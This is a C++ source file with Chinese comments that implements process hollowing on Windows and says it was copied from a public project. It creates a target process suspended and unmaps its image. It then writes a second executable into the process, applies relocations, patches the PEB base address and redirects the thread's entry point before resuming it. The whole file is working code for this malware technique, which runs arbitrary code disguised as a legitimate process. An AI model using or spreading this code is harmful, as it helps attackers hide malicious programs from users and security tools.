/**************************
编(chao)写(xi)于2018-09-19日
抄袭自m0n0ph1/Process-Hollowing
用来Inject的进程必须是GUI进程
***************************/

#include <Windows.h>
#include <iostream>

using namespace std;

typedef struct _BASE_PROCESS_INFO
{
	ULONG BaseAddress;
	CONTEXT ThreadContext;
	PROCESS_INFORMATION ProcessInfo;
}BASE_PROCESS_INFO, *PBASE_PROCESS_INFO;

typedef ULONG(WINAPI *NTUNMAPVIEWOFSECTION)(
	__in HANDLE ProcessHandle,
	__in PVOID BaseAddress
	);

LONG TurnRvaIntoRaw(PIMAGE_NT_HEADERS temp, LONG Rva)
{
	INT NumbersOfSections = temp->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(temp);
	for (int i = 0; i < NumbersOfSections; ++i)
	{
		DWORD StartAddress = SectionHeader->VirtualAddress;
		DWORD EndAddress = StartAddress + SectionHeader->Misc.VirtualSize;
		if (Rva >= StartAddress && Rva <= EndAddress)
		{
			//cout << Rva - StartAddress + SectionHeader->PointerToRawData << endl;
			return Rva - StartAddress + SectionHeader->PointerToRawData;
		}
		++SectionHeader;
	}
	return 0;
}

BOOL CreateInjectProcess(CHAR *ProcessImageName, PBASE_PROCESS_INFO BaseProcessInfo)
{
	STARTUPINFOA StartInfo;
	ZeroMemory(&StartInfo, sizeof(StartInfo));
	StartInfo.cb = sizeof(StartInfo);

	if (CreateProcessA(NULL, ProcessImageName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartInfo, &BaseProcessInfo->ProcessInfo))
	{
		BaseProcessInfo->ThreadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(BaseProcessInfo->ProcessInfo.hThread, &BaseProcessInfo->ThreadContext);

		ULONG Peb = BaseProcessInfo->ThreadContext.Ebx;					//可以查看CreateProcess函数，最后的Context中EBX保存的实际上就是PEB
		ULONG RetSize = 0;
		ReadProcessMemory(BaseProcessInfo->ProcessInfo.hProcess, (PVOID)(Peb + 8), &BaseProcessInfo->BaseAddress, 4, &RetSize);

		return TRUE;
	}

	return FALSE;
}

CHAR* GetProcessBuffer(CHAR *ProcessFilePath)
{
	HANDLE FileHandle = CreateFileA(
		ProcessFilePath,
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
		);

	if (FileHandle == NULL)
	{
		cout << "打开文件 " << ProcessFilePath << "失败！错误码是：" << GetLastError() << endl;
		return NULL;
	}

	ULONG FileSize;
	FileSize = GetFileSize(FileHandle, NULL);

	CHAR *FileBuffer = new CHAR[FileSize];
	if (FileBuffer == NULL)
	{
		cout << "分配内存失败！" << endl;
		CloseHandle(FileHandle);
		return NULL;
	}

	ULONG ReadBytes = 0;
	if (!ReadFile(FileHandle, FileBuffer, FileSize, &ReadBytes, NULL) || ReadBytes != FileSize)
	{
		cout << "读取文件失败！错误码是：" << GetLastError() << endl;
		CloseHandle(FileHandle);
		return NULL;
	}

	return FileBuffer;
}

int main()
{
	HANDLE hMutex = CreateMutexA(NULL, FALSE, "TY_MUTEX");
	if (GetLastError() == ERROR_ALREADY_EXISTS)			//如果当前进程已经存在那么打个招呼就退出
	{
		MessageBoxA(GetDesktopWindow(), "Hello Father！", "", MB_OK);
		return 0;
	}

	BASE_PROCESS_INFO BaseProcessInfo;
	ZeroMemory(&BaseProcessInfo, sizeof(BaseProcessInfo));
	//CreateInjectProcess("C:\\Windows\\system32\\calc.exe", &BaseProcessInfo);
	CHAR FilePath[MAX_PATH];
	cin.getline(FilePath, MAX_PATH);

	do
	{
		CreateInjectProcess(FilePath, &BaseProcessInfo);
		if (BaseProcessInfo.BaseAddress == 0)
		{
			cout << "创建进程失败！" << endl;
			break;
		}

		NTUNMAPVIEWOFSECTION NtUnmapViewofSection = NULL;
		NtUnmapViewofSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

		if (NtUnmapViewofSection == NULL)
		{
			cout << "获取NtUnmapViewofSection函数失败！" << endl;
			break;
		}

		NtUnmapViewofSection(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)BaseProcessInfo.BaseAddress);
		cin.getline(FilePath, MAX_PATH);
		CHAR* ProcessBuffer = GetProcessBuffer(FilePath);
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ProcessBuffer;
		if (DosHeader == NULL)
		{
			cout << "获取进程文件内容失败！" << endl;
			break;
		}

		PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((ULONG)DosHeader + DosHeader->e_lfanew);

		//其实这里可以偷懒，直接在ntheader内部制定的ImageBase分配内存，就不需要重定位了
		LPVOID NewModuleBase = VirtualAllocEx(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)BaseProcessInfo.BaseAddress, NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (NewModuleBase == NULL)
		{
			cout << "分配内存失败！错误码是：" << GetLastError() << endl;
			break;
		}

		//这里保存下之前的NtHeader的ImageBase然后修改一下用以下文写入进去
		ULONG OldImageBase = NtHeader->OptionalHeader.ImageBase;
		NtHeader->OptionalHeader.ImageBase = (ULONG)NewModuleBase;

		BOOL WriteMemoryFlag = 0;
		WriteMemoryFlag = WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, NewModuleBase, (PVOID)ProcessBuffer, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
		if (WriteMemoryFlag == 0)
		{
			cout << "写入映像头失败！错误码是：" << GetLastError() << endl;
			break;
		}

		IMAGE_SECTION_HEADER * SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
		for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; ++i, ++SectionHeader)
		{
			WriteMemoryFlag = WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + SectionHeader->VirtualAddress), (PVOID)(ProcessBuffer + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
			if (WriteMemoryFlag == 0)
			{
				cout << "写入区块" << SectionHeader->Name << "失败！错误码是：" << GetLastError() << endl;
				break;
			}
		}
		if (WriteMemoryFlag == 0)
			break;

		//计算一下是否需要进行重定位运算，用当前模块地址减去NtHeader中要求的模块基址
		ULONG RelctOffset = (ULONG)NewModuleBase - OldImageBase;
		if (RelctOffset)
		{
			//虽然我特意在InjectedProcess的NtHeader->OptionalHeader.ImageBase的位置分配内存
			//这样就不需要进行重定位了
			//但是实际上并不是每次都能在那个位置分配成功
			//因此这里重定位的操作还是要写
			cout << "需要进行重定位！" << endl;

			if (NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
			{
				IMAGE_BASE_RELOCATION *RelocationImage = (IMAGE_BASE_RELOCATION *)(ProcessBuffer + TurnRvaIntoRaw(NtHeader, NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));

				for (; RelocationImage->VirtualAddress != 0;)
				{
					/*这里具体为什么写
					#define CountRelocationEntries(dwBlockSize)		\
					(dwBlockSize -								\
					sizeof(BASE_RELOCATION_BLOCK)) /			\
					sizeof(BASE_RELOCATION_ENTRY)
					就查看这个*/
					ULONG NumberOfBlocks = (RelocationImage->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;

					USHORT * Block = (USHORT *)((CHAR*)RelocationImage + sizeof(IMAGE_BASE_RELOCATION));
					for (ULONG i = 0; i < NumberOfBlocks; ++i, Block++)
					{
						USHORT addr = *Block & 0x0fff;											//用低12位作为标志。
						USHORT sign = *Block >> 12;												//高四位作为标志来运算
						if (sign == 3)
						{
							ULONG AddressOffset = RelocationImage->VirtualAddress + addr;				//Block是当前页面内部的便宜地址，所以加上当前页面的位置即是总偏移地址。

							ULONG OldValue = 0;
							ReadProcessMemory(BaseProcessInfo .ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + AddressOffset), &OldValue, 4, NULL);
							OldValue += RelctOffset;
							WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + AddressOffset), &OldValue, 4, NULL);
						}
						else if (sign == 0)
						{
							//sign为0的模块仅仅是为了对齐内存。
						}
					}
					RelocationImage = (IMAGE_BASE_RELOCATION *)((char*)RelocationImage + RelocationImage->SizeOfBlock);
				}
			}

		}

		WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)(BaseProcessInfo.ThreadContext.Ebx + 8), &NewModuleBase, 4, NULL);

		BaseProcessInfo.ThreadContext.Eax = (ULONG)NewModuleBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
		BaseProcessInfo.ThreadContext.ContextFlags = CONTEXT_FULL;
		SetThreadContext(BaseProcessInfo.ProcessInfo.hThread, &BaseProcessInfo.ThreadContext);
		ResumeThread(BaseProcessInfo.ProcessInfo.hThread);

	} while (FALSE);

	system("pause");
	return 0;
}